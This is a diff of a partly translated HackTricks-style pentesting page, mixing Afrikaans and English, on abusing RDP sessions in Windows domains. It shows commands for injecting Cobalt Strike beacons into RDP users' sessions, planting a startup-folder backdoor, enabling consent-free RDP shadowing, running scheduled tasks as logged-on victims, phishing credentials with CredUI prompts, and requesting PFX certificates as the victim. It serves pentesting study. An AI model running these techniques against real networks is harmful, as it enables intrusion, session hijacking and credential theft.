@@ -1,12 +1,12 @@
-# RDP Sessie Misbruik
+# RDP Sessions Abuse
 
 {{#include ../../banners/hacktricks-training.md}}
 
 ## RDP Process Injection
 
-As die **eksterne groep** **RDP toegang** het tot enige **rekenaar** in die huidige domein, kan 'n **aanvaller** **daardie rekenaar kompromitteer en vir hom wag**.
+As die **external group** **RDP access** tot enige **computer** in die huidige domein het, kan 'n **attacker** **compromise that computer and wait for him**.
 
-Sodra daardie gebruiker via RDP toegang verkry het, kan die **aanvaller pivot na daardie gebruiker se sessie** en sy regte in die eksterne domein misbruik.
+Sodra daardie gebruiker via RDP toegang verkry het, kan die **attacker can pivot to that users session** en misbruik maak van die bevoegdhede daarvan in die eksterne domein.
 ```bash
 # Supposing the group "External Users" has RDP access in the current domain
 ## lets find where they could access
@@ -30,11 +30,11 @@ PID   PPID  Name                         Arch  Session     User
 beacon> inject 4960 x64 tcp-local
 ## From that beacon you can just run powerview modules interacting with the external domain as that user
 ```
-Kyk na **ander maniere om sessies met ander gereedskap te steel** [**in this page.**](../../network-services-pentesting/pentesting-rdp.md#session-stealing)
+Kyk na **other ways to steal sessions with other tools** [**in this page.**](../../network-services-pentesting/pentesting-rdp.md#session-stealing)
 
 ## RDPInception
 
-As 'n gebruiker via **RDP into a machine** toegang kry waar 'n **attacker** vir hom **waiting** is, sal die attacker in staat wees om **inject a beacon in the RDP session of the user**, en as die **victim mounted his drive** toe hy via RDP toegang gekry het, kan die **attacker could access it**.
+As 'n gebruiker via **RDP into a machine** toegang kry tot 'n masjien waar 'n **attacker** vir hom wag, sal die **attacker** in staat wees om **inject a beacon in the RDP session of the user**, en as die **victim mounted his drive** toe hy via RDP toegang gekry het, kan die **attacker** daarby toegang kry.
 
 In hierdie geval kan jy net **compromise** die **victims** **original computer** deur 'n **backdoor** in die **statup folder** te skryf.
 ```bash
@@ -70,19 +70,19 @@ beacon> upload C:\Payloads\pivot.exe
 ```
 ## Shadow RDP
 
-As jy 'n **local admin** op 'n host is waar die slagoffer reeds 'n **active RDP session** het, kan jy moontlik **view/control that desktop without stealing the password or dumping LSASS**.
+As jy 'n **local admin** op 'n host is waar die slagoffer reeds 'n **active RDP session** het, mag jy dalk daardie desktop **view/control** sonder om die password te steel of LSASS te dump.
 
-Dit hang af van die **Remote Desktop Services shadowing** beleid wat gestoor is in:
+Dit hang af van die **Remote Desktop Services shadowing** policy wat gestoor is in:
 ```text
 HKLM\Software\Policies\Microsoft\Windows NT\Terminal Services\Shadow
 ```
 Interessante waardes:
 
-- `0`: Gedeaktiveer
-- `1`: `EnableInputNotify` (beheer, gebruikersgoedkeuring benodig)
+- `0`: Uitgeskakel
+- `1`: `EnableInputNotify` (beheer, gebruikersgoedkeuring vereis)
 - `2`: `EnableInputNoNotify` (beheer, **geen gebruikersgoedkeuring**)
-- `3`: `EnableNoInputNotify` (slegs-kyk, gebruikersgoedkeuring benodig)
-- `4`: `EnableNoInputNoNotify` (slegs-kyk, **geen gebruikersgoedkeuring**)
+- `3`: `EnableNoInputNotify` (slegs-weergave, gebruikersgoedkeuring vereis)
+- `4`: `EnableNoInputNoNotify` (slegs-weergave, **geen gebruikersgoedkeuring**)
 ```cmd
 :: Check the policy
 reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v Shadow
@@ -94,51 +94,51 @@ reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v Shado
 quser /server:<HOST>
 mstsc /v:<HOST> /shadow:<SESSION_ID> /control /noconsentprompt /prompt
 ```
-Dit is veral nuttig wanneer 'n bevoorregte gebruiker wat oor RDP verbind is, 'n ontgrendelde lessenaar, KeePass-sessie, MMC-konsol, blaaier-sessie of admin shell oopgelaat het.
+Dit is veral nuttig wanneer 'n geprivilegieerde gebruiker wat oor RDP verbind is, 'n ontgrendelde lessenaar, KeePass-sessie, MMC-konsol, browser session, of admin shell oopgelaat het.
 
-## Geskeduleerde take as aangemelde gebruiker
+## Scheduled Tasks as aangemelde gebruiker
 
-As jy 'n **local admin** is en die teikengebruiker **tans aangemeld** is, kan Task Scheduler kode begin **as daardie gebruiker sonder hul wagwoord**.
+As jy **local admin** is en die teiken gebruiker **op die oomblik aangemeld is**, kan Task Scheduler code begin **as daardie gebruiker sonder hul wagwoord**.
 
-Dit verander die slagoffer se bestaande aanmeldessie in 'n uitvoeringsprimitief:
+Dit verander die slagoffer se bestaande logon session in 'n execution primitive:
 ```cmd
 schtasks /create /S <HOST> /RU "<DOMAIN\\user>" /SC ONCE /ST 00:00 /TN "Updater" /TR "cmd.exe /c whoami > C:\\Windows\\Temp\\whoami.txt"
 schtasks /run /S <HOST> /TN "Updater"
 ```
-Aantekeninge:
+Notes:
 
-- As die gebruiker **nie aangemeld is nie**, vereis Windows gewoonlik die wagwoord om 'n taak te skep wat as hulle loop.
-- As die gebruiker **aangemeld is**, kan die taak die bestaande aanmeldkonteks hergebruik.
-- Dit is 'n praktiese manier om GUI-aksies uit te voer of binaries binne die slagoffer se sessie te begin sonder om LSASS aan te raak.
+- If the user is **not logged on**, Windows usually requires the password to create a task that runs as them.
+- If the user **is logged on**, the task can reuse the existing logon context.
+- This is a practical way to execute GUI actions or launch binaries inside the victim session without touching LSASS.
 
-## CredUI Prompt-misbruik vanaf die slagoffer se sessie
+## CredUI Prompt Abuse From the Victim Session
 
-Sodra jy kan uitvoer **binne die slagoffer se interaktiewe lessenaar** (byvoorbeeld via **Shadow RDP** of **'n scheduled task running as that user**), kan jy 'n **egte Windows-aanmeldprompt** vertoon met CredUI APIs en die deur die slagoffer ingevoerde kredensies oes.
+Once you can execute **inside the victim's interactive desktop** (for example via **Shadow RDP** or **a scheduled task running as that user**), you can display a **real Windows credential prompt** using CredUI APIs and harvest credentials entered by the victim.
 
 Relevant APIs:
 
 - `CredUIPromptForWindowsCredentials`
 - `CredUnPackAuthenticationBuffer`
 
-Tipiese vloei:
+Typical flow:
 
-1. Start 'n binary in die slagoffer se sessie.
-2. Vertoon 'n domein-aouthentiseringsprompt wat by die huidige domein-branding pas.
-3. Pak die teruggegewe auth buffer uit.
-4. Valideer die gegewe kredensies en hou opsioneel aan om te vra totdat geldige kredensies ingevoer is.
+1. Spawn a binary in the victim session.
+2. Display a domain-authentication prompt that matches the current domain branding.
+3. Unpack the returned auth buffer.
+4. Validate the provided credentials and optionally keep prompting until valid credentials are entered.
 
-Dit is nuttig vir **on-host phishing** omdat die prompt deur standaard Windows APIs gerender word in plaas van 'n valse HTML-vorm.
+This is useful for **on-host phishing** because the prompt is rendered by standard Windows APIs instead of a fake HTML form.
 
 ## Requesting a PFX In the Victim Context
 
-Die selfde **scheduled-task-as-user** primitive kan gebruik word om 'n **certificate/PFX as the logged-on victim** aan te vra. Daardie sertifikaat kan later gebruik word vir **AD authentication** as daardie gebruiker, wat wagwoorddiefstal heeltemal vermy.
+The same **scheduled-task-as-user** primitive can be used to request a **certificate/PFX as the logged-on victim**. That certificate can later be used for **AD authentication** as that user, avoiding password theft entirely.
 
-Hoëvlak-vloei:
+High-level flow:
 
-1. Kry **local admin** op 'n host waar die slagoffer aangemeld is.
-2. Voer enrollment/export logika as die slagoffer uit deur 'n **scheduled task** te gebruik.
-3. Eksporteer die resulterende **PFX**.
-4. Gebruik die PFX vir PKINIT / certificate-based AD authentication.
+1. Gain **local admin** on a host where the victim is logged on.
+2. Run enrollment/export logic as the victim using a **scheduled task**.
+3. Export the resulting **PFX**.
+4. Use the PFX for PKINIT / certificate-based AD authentication.
 
 See the AD CS pages for follow-up abuse:
 
